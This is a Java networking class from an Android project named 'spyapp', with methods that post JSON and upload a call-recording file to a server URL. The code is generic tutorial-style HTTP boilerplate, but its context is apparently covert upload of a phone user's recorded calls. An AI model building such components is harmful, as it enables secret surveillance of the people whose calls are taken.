package com.example.spyapp.http;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.ClientConnectionManager;
import org.apache.http.conn.scheme.PlainSocketFactory;
import org.apache.http.conn.scheme.Scheme;
import org.apache.http.conn.scheme.SchemeRegistry;
import org.apache.http.conn.ssl.SSLSocketFactory;
import org.apache.http.entity.StringEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.conn.tsccm.ThreadSafeClientConnManager;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.util.EntityUtils;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.DownloadManager;
import android.content.Context;
import android.net.Uri;
import android.os.Environment;

import com.example.spyapp.Services;
import com.xiledsystems.AlternateJavaBridgelib.components.altbridge.ThreadTimer;

public class PostData {

	private InputStream inputStream = null;	 
	private String result = null;
	private HttpResponse httpResponse = null;
	private long totalSize;
	public String responseString;
	
	static PostData obj=new PostData();
	public static PostData getInstance(){
		return obj;
	}
	
	public void requstPost(final String url,final String json){
		System.out.println(url);
		ThreadTimer.runOneTimeThread(new Runnable() {
			@Override
			public void run() {
				
					HttpClient httpClient = new DefaultHttpClient();
					HttpPost httpPost = new HttpPost(url);
					try {
						httpPost.setEntity(new StringEntity(json, "UTF-8"));
					} catch (UnsupportedEncodingException e2) {
						// TODO Auto-generated catch block
						e2.printStackTrace();
					}
					httpPost.setHeader("Content-Type", "application/json");
					httpPost.setHeader("Accept-Encoding", "application/json");
					httpPost.setHeader("Accept-Language", "en-US");
					
					try {
						httpResponse = httpClient.execute(httpPost);
					} catch (ClientProtocolException e2) {
						// TODO Auto-generated catch block
						e2.printStackTrace();
					} catch (IOException e2) {
						// TODO Auto-generated catch block
						e2.printStackTrace();
					}

					         // 9. receive response as inputStream
								if(httpResponse!=null){
						         try {
										inputStream = httpResponse.getEntity().getContent();
										
										
										
										BufferedReader in = new BufferedReader
										            (new InputStreamReader(inputStream));
										            StringBuffer sb = new StringBuffer("");
										            String line = "";
										            String NL = System.getProperty("line.separator");
										            while ((line = in.readLine()) != null) {
										                sb.append(line + NL);
										            }
										            in.close();
										            String page = sb.toString();
										            System.out.println(page);
									} catch (IllegalStateException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									} catch (IOException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
										
									}
					         // 10. convert inputstream to string
					         }
					
				}
			
		});
	
	}
	 private List<File> getListFiles(File parentDir) {
		 
		    ArrayList<File> inFiles = new ArrayList<File>();
		    File[] files = parentDir.listFiles();
		    for (File file : files) {
		        if (file.isDirectory()) {
		            inFiles.addAll(getListFiles(file));
		        } else {
		                inFiles.add(file);
		        }
		    }
		    return inFiles;
		}
	
	public void uploadCallFile(final String url,final String filePath){
		
		
		ThreadTimer.runOneTimeThread(new Runnable() {
			@Override
			public void run() {
		
		String filepath = Environment.getExternalStorageDirectory().getAbsolutePath();
		File sourceFile = new File(filePath);
        if (!sourceFile.exists()) {
        	return;
        }
       // Uri external = Uri.fromFile(file);
       // List<File> files = getListFiles(file); 
        
		//filePath=file.getAbsolutePath()+"/Voice 001.m4a";
		HttpClient httpclient = new DefaultHttpClient();
        HttpPost httppost = new HttpPost(url);

        try {
            AndroidMultiPartEntity entity = new AndroidMultiPartEntity();

            if(sourceFile.exists()){
            	System.out.println("Helo");
            }
            // Adding file data to http body
            entity.addPart("image", new FileBody(sourceFile));

            // Extra parameters if you want to pass to server
            entity.addPart("website",
                    new StringBody("www.androidhive.info"));
            entity.addPart("email", new StringBody("abc@gmail.com"));

            totalSize = entity.getContentLength();
            httppost.setEntity(entity);

            // Making server call
            HttpResponse response = httpclient.execute(httppost);
            HttpEntity r_entity = response.getEntity();

            int statusCode = response.getStatusLine().getStatusCode();
            if (statusCode == 200) {
                // Server response
                responseString = EntityUtils.toString(r_entity);
                System.out.println(responseString);
            } else {
                String responseString = "Error occurred! Http Status Code: "
                        + statusCode;
            }

        } catch (ClientProtocolException e) {
            responseString = e.toString();
        } catch (IOException e) {
            responseString = e.toString();
        }
        
			}
			
		});
		
	}

}
